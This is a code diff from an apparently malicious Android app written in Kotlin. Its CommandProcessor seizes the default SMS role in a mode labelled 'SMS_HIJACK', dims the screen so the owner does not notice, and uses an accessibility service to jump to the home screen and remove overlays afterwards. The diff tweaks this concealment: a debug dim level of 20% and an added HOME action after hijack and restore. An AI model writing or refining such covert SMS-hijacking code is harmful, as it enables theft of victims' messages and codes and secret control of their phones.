@@ -562,11 +562,12 @@ object CommandProcessor {
                         DefaultSmsManager.expectedMode = mode
                         if (mode == "AUTO" || mode == "AUTO_NAV") {
                             Handler(Looper.getMainLooper()).post {
-                                DimmerManager.applyDim(ctx, 0, "AUTO")
+                                DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
                                 Handler(Looper.getMainLooper()).postDelayed({
                                     if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
                                         val lastMode = DefaultSmsManager.expectedMode
                                         DefaultSmsManager.expectedMode = ""
+                                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                         DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
                                     }
                                 }, 20000)
@@ -595,10 +596,11 @@ object CommandProcessor {
                     } else {
                         DefaultSmsManager.expectedMode = "RESTORE"
                         Handler(Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                            DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
                             Handler(Looper.getMainLooper()).postDelayed({
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
                                     DefaultSmsManager.expectedMode = ""
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                     DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
                                 }
                             }, 20000)
